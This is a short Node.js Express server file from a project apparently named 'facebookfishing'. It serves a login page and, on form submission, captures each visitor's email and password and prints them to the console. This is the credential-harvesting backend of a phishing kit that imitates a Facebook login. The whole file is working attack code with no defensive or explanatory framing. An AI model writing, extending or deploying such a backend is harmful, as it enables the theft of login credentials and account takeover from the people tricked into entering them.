const express = require('express');
const cors = require("cors");

const app = express();

const port = 8080;

app.use(express.static('public'))
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile('C:/Users/abina/github/fishing/facebookfishing/public/index.html');
}) 
app.post('/', (req, res) => {
    const { email } = req.body 
    const valuei=req.body.pass
    console.log("email:  "+email)
    console.log("pass:  "+valuei+"\n")
    res.sendFile('C:/Users/abina/github/fishing/facebookfishing/public/index.html');
})

app.listen(port, () => console.log(`server is running on port ${port}`))

